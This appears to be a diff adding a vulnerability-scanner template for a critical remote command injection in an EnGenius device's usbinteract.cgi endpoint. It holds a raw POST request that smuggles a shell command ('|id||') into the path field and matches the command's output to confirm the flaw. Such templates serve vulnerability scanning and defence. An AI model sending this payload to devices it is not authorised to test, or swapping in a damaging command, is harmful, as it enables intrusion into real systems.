@@ -1,0 +1,34 @@
+id: EnGenius-usbinteract-RCE
+
+info:
+  name: EnGenius-usbinteract-RCE
+  author: iSee857
+  severity: critical
+  description: EnGenius-usbinteract-RCE
+  reference:
+    - https://github.com/iSee857
+  tags: EnGenius,Rce
+
+
+http:
+  - raw:
+      - |
+        POST /web/cgi-bin/usbinteract.cgi HTTP/1.1
+        Host: {{Host}}
+        Content-Type: multipart/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0
+
+        action=7&path="|id||"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "uid"
+          - "gid"
+          - "text/html"
+        part: header
+
+      - type: status
+        status:
+          - 200
